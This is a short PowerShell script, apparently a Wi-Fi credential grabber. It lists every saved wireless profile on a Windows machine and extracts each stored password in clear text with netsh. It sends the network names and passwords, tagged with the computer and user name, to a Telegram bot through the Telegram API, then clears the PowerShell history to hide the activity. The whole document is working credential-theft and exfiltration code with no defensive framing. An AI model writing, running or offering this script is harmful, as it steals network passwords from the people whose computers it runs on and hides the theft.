$wifiProfiles = @()

netsh wlan show profiles | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan = $_.Matches.Value.Trim()
    
    $passwordOutput = netsh wlan show profile name="$wlan" key=clear 2>&1
    
    $keyContentLine = $passwordOutput | Select-String 'Key Content' -Quiet
    if ($keyContentLine) {
        $password = ($passwordOutput | Select-String 'Key Content').Line.Split(":")[-1].Trim()
        $wifiProfiles += ("{0} : {1}" -f $wlan, $password)
    }
}

$wifiList = "Данные об точках доступа WIFI с компьютера $env:COMPUTERNAME - $env:USERNAME" + ($wifiProfiles -join "`n")

$Body = @{
    "chat_id" = $chatId
    "text"    = $wifiList
} | ConvertTo-Json
$jsonBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)

Invoke-RestMethod -ContentType 'Application/Json' -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $jsonBytes

Clear-History
